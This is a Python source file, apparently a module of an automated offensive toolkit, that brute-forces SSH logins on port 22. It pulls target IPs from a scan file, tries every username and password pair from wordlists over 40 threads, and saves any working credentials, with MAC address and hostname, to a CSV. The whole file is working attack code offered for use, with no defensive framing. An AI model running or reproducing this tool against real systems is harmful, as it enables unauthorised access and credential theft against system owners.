"""
ssh_connector.py - This script performs a brute force attack on SSH services (port 22) to find accessible accounts using various user credentials. It logs the results of successful connections.
"""

import os
import pandas as pd
import paramiko
import socket
import threading
import logging
from queue import Queue
from rich.console import Console
from rich.progress import Progress, BarColumn, TextColumn, SpinnerColumn
from shared import SharedData
from logger import Logger

# Configure the logger
logger = Logger(name="ssh_connector.py", level=logging.DEBUG)

# Define the necessary global variables
b_class = "SSHBruteforce"
b_module = "ssh_connector"
b_status = "brute_force_ssh"
b_port = 22
b_parent = None

class SSHBruteforce:
    """
    Class to handle the SSH brute force process.
    """
    def __init__(self, shared_data):
        self.shared_data = shared_data
        self.ssh_connector = SSHConnector(shared_data)
        logger.info("SSHConnector initialized.")

    def bruteforce_ssh(self, ip, port):
        """
        Run the SSH brute force attack on the given IP and port.
        """
        logger.info(f"Running bruteforce_ssh on {ip}:{port}...")
        return self.ssh_connector.run_bruteforce(ip, port)
    
    def execute(self, ip, port, row, status_key):
        """
        Execute the brute force attack and update status.
        """
        logger.info(f"Executing SSHBruteforce on {ip}:{port}...")
        self.shared_data.bjornorch_status = "SSHBruteforce"
        success, results = self.bruteforce_ssh(ip, port)
        return 'success' if success else 'failed'

class SSHConnector:
    """
    Class to manage the connection attempts and store the results.
    """
    def __init__(self, shared_data):
        self.shared_data = shared_data
        self.scan = pd.read_csv(shared_data.netkbfile)

        if "Ports" not in self.scan.columns:
            self.scan["Ports"] = None
        self.scan = self.scan[self.scan["Ports"].str.contains("22", na=False)]

        self.users = open(shared_data.usersfile, "r").read().splitlines()
        self.passwords = open(shared_data.passwordsfile, "r").read().splitlines()

        self.lock = threading.Lock()
        self.sshfile = shared_data.sshfile
        if not os.path.exists(self.sshfile):
            logger.info(f"File {self.sshfile} does not exist. Creating...")
            with open(self.sshfile, "w") as f:
                f.write("MAC Address,IP Address,Hostname,User,Password,Port\n")
        self.results = []  # List to store results temporarily
        self.queue = Queue()
        self.console = Console()

    def load_scan_file(self):
        """
        Load the netkb file and filter it for SSH ports.
        """
        self.scan = pd.read_csv(self.shared_data.netkbfile)
        if "Ports" not in self.scan.columns:
            self.scan["Ports"] = None
        self.scan = self.scan[self.scan["Ports"].str.contains("22", na=False)]

    def ssh_connect(self, adresse_ip, user, password):
        """
        Attempt to connect to an SSH service using the given credentials.
        """
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        try:
            ssh.connect(adresse_ip, username=user, password=password, banner_timeout=200)  # Adjust timeout as necessary
            return True
        except (paramiko.AuthenticationException, socket.error, paramiko.SSHException):
            return False
        finally:
            ssh.close()  # Ensure the SSH connection is closed

    def worker(self, progress, task_id, success_flag):
        """
        Worker thread to process items in the queue.
        """
        while not self.queue.empty():
            if self.shared_data.orchestrator_should_exit:
                logger.info("Orchestrator exit signal received, stopping worker thread.")
                break

            adresse_ip, user, password, mac_address, hostname, port = self.queue.get()
            if self.ssh_connect(adresse_ip, user, password):
                with self.lock:
                    self.results.append([mac_address, adresse_ip, hostname, user, password, port])
                    logger.success(f"Found credentials  IP: {adresse_ip} | User: {user} | Password: {password}")
                    self.save_results()
                    self.removeduplicates()
                    success_flag[0] = True
            self.queue.task_done()
            progress.update(task_id, advance=1)


    def run_bruteforce(self, adresse_ip, port):
        self.load_scan_file()  # Reload the scan file to get the latest IPs and ports

        mac_address = self.scan.loc[self.scan['IPs'] == adresse_ip, 'MAC Address'].values[0]
        hostname = self.scan.loc[self.scan['IPs'] == adresse_ip, 'Hostnames'].values[0]

        total_tasks = len(self.users) * len(self.passwords)
        
        for user in self.users:
            for password in self.passwords:
                if self.shared_data.orchestrator_should_exit:
                    logger.info("Orchestrator exit signal received, stopping bruteforce task addition.")
                    return False, []
                self.queue.put((adresse_ip, user, password, mac_address, hostname, port))

        success_flag = [False]
        threads = []
        
        with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), BarColumn(), TextColumn("[progress.percentage]{task.percentage:>3.0f}%")) as progress:
            task_id = progress.add_task("[cyan]Bruteforcing SSH...", total=total_tasks)
            
            for _ in range(40):  # Adjust the number of threads based on the RPi Zero's capabilities
                t = threading.Thread(target=self.worker, args=(progress, task_id, success_flag))
                t.start()
                threads.append(t)

            while not self.queue.empty():
                if self.shared_data.orchestrator_should_exit:
                    logger.info("Orchestrator exit signal received, stopping bruteforce.")
                    while not self.queue.empty():
                        self.queue.get()
                        self.queue.task_done()
                    break

            self.queue.join()

            for t in threads:
                t.join()

        return success_flag[0], self.results  # Return True and the list of successes if at least one attempt was successful


    def save_results(self):
        """
        Save the results of successful connection attempts to a CSV file.
        """
        df = pd.DataFrame(self.results, columns=['MAC Address', 'IP Address', 'Hostname', 'User', 'Password', 'Port'])
        df.to_csv(self.sshfile, index=False, mode='a', header=not os.path.exists(self.sshfile))
        self.results = []  # Reset temporary results after saving

    def removeduplicates(self):
        """
        Remove duplicate entries from the results CSV file.
        """
        df = pd.read_csv(self.sshfile)
        df.drop_duplicates(inplace=True)
        df.to_csv(self.sshfile, index=False)

if __name__ == "__main__":
    shared_data = SharedData()
    try:
        ssh_bruteforce = SSHBruteforce(shared_data)
        logger.info("Démarrage de l'attaque SSH... sur le port 22")
        
        # Load the netkb file and get the IPs to scan
        ips_to_scan = shared_data.read_data()
        
        # Execute the brute force on each IP
        for row in ips_to_scan:
            ip = row["IPs"]
            logger.info(f"Executing SSHBruteforce on {ip}...")
            ssh_bruteforce.execute(ip, b_port, row, b_status)
        
        logger.info(f"Nombre total de succès: {len(ssh_bruteforce.ssh_connector.results)}")
        exit(len(ssh_bruteforce.ssh_connector.results))
    except Exception as e:
        logger.error(f"Erreur: {e}")
